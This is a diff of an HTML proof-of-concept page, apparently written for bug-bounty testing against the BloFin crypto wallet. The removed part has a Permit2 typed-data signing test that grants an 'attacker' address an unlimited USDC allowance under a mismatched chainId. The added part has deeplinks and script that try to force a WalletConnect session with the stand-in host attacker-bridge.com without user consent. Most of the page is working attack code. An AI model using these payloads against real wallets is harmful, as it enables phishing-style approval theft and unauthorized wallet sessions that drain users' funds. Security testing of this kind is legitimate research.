@@ -3,130 +3,86 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BLOFIN TEST / CHAINID MISMATCH</title>
+<title>BLOFIN WC DEEPLINK INJECTION TEST</title>
 <style>
-body { font-family: monospace; background: #0a0a0a; color: #fff; padding: 20px; }
-button { width: 100%; padding: 15px; margin: 10px 0; background: #7c3aed; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; }
-button:disabled { background: #333; }
-.log { background: #111; padding: 15px; border-radius: 10px; margin-top: 15px; word-break: break-all; font-size: 12px; border: 1px solid #333; }
-.red { color: #ef4444; }.green { color: #22c55e; }.yellow { color: #eab308; }
-h2 { color: #7c3aed; }
+body{font-family:monospace;background:#000;color:#fff;padding:20px;line-height:1.6}
+h1{color:#ff3b30;font-size:22px}
+h2{color:#ffcc00;margin-top:30px;font-size:16px}
+button{width:100%;padding:18px;margin:12px 0;background:#ff3b30;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:bold}
+button.blue{background:#0a84ff}
+.card{background:#111;border:1px solid #333;padding:15px;border-radius:12px;margin:15px 0;word-break:break-all}
+a{color:#5ac8fa;font-size:14px;display:block;margin:10px 0}
+.log{background:#1c1c1e;padding:15px;border-radius:10px;margin-top:20px;font-size:12px;min-height:80px}
+.red{color:#ff3b30}.green{color:#30d158}.yellow{color:#ffd60a}
 </style>
 </head>
 <body>
 
-<h2>BLOFIN TEST / CHAINID MISMATCH [Critical]</h2>
-<p>Test: Wallet on BSC (56) but signing message for ETH Mainnet (1)</p>
+<h1>BLOFIN TEST: WalletConnect Deeplink Injection</h1>
+<p>Bug class: Unauthorized auto-connect via external deeplink. Sepi hunter.</p>
 
-<button id="connect">1. CONNECT WALLET</button>
-<div id="status" class="log">Status: Not connected</div>
+<div class="card">
+<b>Attacker Goal:</b> Force victim's BloFin wallet to auto-connect to attacker-controlled WalletConnect bridge without user consent, just by clicking a link outside the wallet.
+</div>
 
-<button id="testMismatch">2. TEST CHAINID MISMATCH (chainId: 1 on BSC)</button>
-<button id="testCorrect">3. TEST CORRECT (chainId: 56 on BSC) - Control</button>
+<h2>TEST 1: In-App WC Injection (via dApp Browser)</h2>
+<button id="connect">1. CONNECT WALLET IN BLOFIN</button>
+<div id="status" class="card">Not connected</div>
+<button id="testInApp" class="blue">2. TEST wallet_connect INJECTION</button>
+
+<h2>TEST 2: External Deeplink (Manual - Buka di Safari)</h2>
+<div class="card">
+Ini yang paling kritikal. Buka halaman ini di <b>Safari iPhone (di luar BloFin)</b> lalu klik link di bawah. Lihat apakah BloFin langsung connect tanpa konfirmasi.
+<br><br>
+<b>Deeplink 1 (blofin:// scheme):</b>
+<a href="blofin://wc?uri=wc%3A7f6e9a1d2c3b4a5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d%401%3Fbridge%3Dhttps%3A%2F%2Fattacker-bridge.com%26key%3D1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef">blofin://wc?uri=wc:7f6e...attacker-bridge.com</a>
+
+<b>Deeplink 2 (Universal Link):</b>
+<a href="https://blofin.com/wc?uri=wc%3A7f6e9a1d2c3b4a5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d%401%3Fbridge%3Dhttps%3A%2F%2Fattacker-bridge.com%26key%3D1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef">https://blofin.com/wc?uri=wc:7f6e...attacker-bridge.com</a>
+
+<b>Expected Secure:</b> BloFin opens but shows "Do you want to connect to attacker-bridge.com?" with Reject/Approve.<br>
+<b>BUG CONFIRMED:</b> BloFin opens and auto-approves, or directly shows connected dApp session to attacker-bridge.com without prompt.
+</div>
 
 <div id="log" class="log">Logs will appear here...</div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
-let provider, signer, userAddress;
+let provider, signer;
 const logEl = document.getElementById('log');
 const statusEl = document.getElementById('status');
+function log(msg, cls=''){ logEl.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`; }
 
-function log(msg, cls='') {
-  logEl.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-}
-
-const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-const SPENDER_ATTACKER = "0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80";
-
-const domainMismatch = {
-  name: "Permit2",
-  chainId: 1,
-  verifyingContract: PERMIT2_ADDRESS
-};
-
-const domainCorrect = {
-  name: "Permit2",
-  chainId: 56,
-  verifyingContract: PERMIT2_ADDRESS
-};
-
-const types = {
-  TokenPermissions: [
-    { name: "token", type: "address" },
-    { name: "amount", type: "uint256" }
-  ],
-  PermitWitnessTransferFrom: [
-    { name: "permitted", type: "TokenPermissions" },
-    { name: "spender", type: "address" },
-    { name: "nonce", type: "uint256" },
-    { name: "deadline", type: "uint256" },
-    { name: "witness", type: "Witness" }
-  ],
-  Witness: [
-    { name: "message", type: "string" },
-    { name: "chainInfo", type: "string" }
-  ]
-};
-
-function getMessage(isMismatch) {
-  return {
-    permitted: {
-      token: USDC_ADDRESS,
-      amount: "115792089237316195423570985008687907853269984665640564039457584007913129639935"
-    },
-    spender: SPENDER_ATTACKER,
-    nonce: "0",
-    deadline: "9999999999999",
-    witness: {
-      message: isMismatch? "CHAINID MISMATCH TEST: You are on BSC but signing for ETH" : "CORRECT CHAIN TEST: BSC to BSC",
-      chainInfo: isMismatch? "Wallet: BSC (56) | Domain: ETH (1) | EXPLOITABLE" : "Wallet: BSC (56) | Domain: BSC (56) | SAFE"
-    }
-  };
-}
-
-document.getElementById('connect').onclick = async () => {
-  try {
+document.getElementById('connect').onclick = async()=>{
+  try{
     provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     signer = provider.getSigner();
-    userAddress = await signer.getAddress();
-    const network = await provider.getNetwork();
-    statusEl.innerHTML = `Connected: ${userAddress}<br>Current ChainId: ${network.chainId}`;
-    log(`Connected ${userAddress} on chain ${network.chainId}`, "green");
-    if (network.chainId!== 56) {
-      log(`WARNING: Switch to BSC (56). Current is ${network.chainId}`, "yellow");
-    } else {
-      log(`Perfect! You are on BSC (56). Now test MISMATCH (chainId 1)`, "yellow");
-    }
-  } catch (e) {
-    log("Connect failed: " + e.message, "red");
-  }
+    const addr = await signer.getAddress();
+    const net = await provider.getNetwork();
+    statusEl.innerHTML = `Connected: ${addr}<br>Chain: ${net.chainId}`;
+    log(`Connected ${addr}`, 'green');
+  }catch(e){ log(`Connect failed: ${e.message}`, 'red'); }
 };
 
-async function sign(isMismatch) {
-  try {
-    if (!signer) { log("Connect first", "red"); return; }
-    const domain = isMismatch? domainMismatch : domainCorrect;
-    const message = getMessage(isMismatch);
-    const network = await provider.getNetwork();
-
-    log(`Signing... Wallet Chain: ${network.chainId} | Domain Chain: ${domain.chainId}`, "yellow");
-    log(`If NO Chain Mismatch warning, BUG CONFIRMED`, "red");
-
-    const signature = await signer._signTypedData(domain, types, message);
-
-    log(`SIGNATURE: ${signature}`, "green");
-    log(`BUG CONFIRMED: Allowed chainId ${domain.chainId} while on ${network.chainId}`, "red");
-
-  } catch (e) {
-    log("Sign failed: " + (e.message || e), "red");
+document.getElementById('testInApp').onclick = async()=>{
+  if(!provider){ log('Connect first', 'red'); return; }
+  const wcUri = "wc:7f6e9a1d2c3b4a5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d@1?bridge=https://attacker-bridge.com&key=1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef";
+  log(`Trying in-app injection with wc uri: ${wcUri.substring(0,40)}...`, 'yellow');
+  
+  const methods = ["wallet_connect", "wc_connect", "walletconnect_connect"];
+  for(let m of methods){
+    try{
+      log(`Trying method: ${m}`, 'yellow');
+      const res = await provider.send(m, [{uri: wcUri}]);
+      log(`METHOD ${m} SUCCESS: ${JSON.stringify(res)} - BUG CONFIRMED`, 'red');
+      return;
+    }catch(e){
+      log(`Method ${m} failed: ${e.message}`, 'green');
+    }
   }
-}
-
-document.getElementById('testMismatch').onclick = () => sign(true);
-document.getElementById('testCorrect').onclick = () => sign(false);
+  log(`All in-app WC methods blocked (secure for in-app). Now test external deeplink in Safari.`, 'yellow');
+};
 </script>
 </body>
 </html>
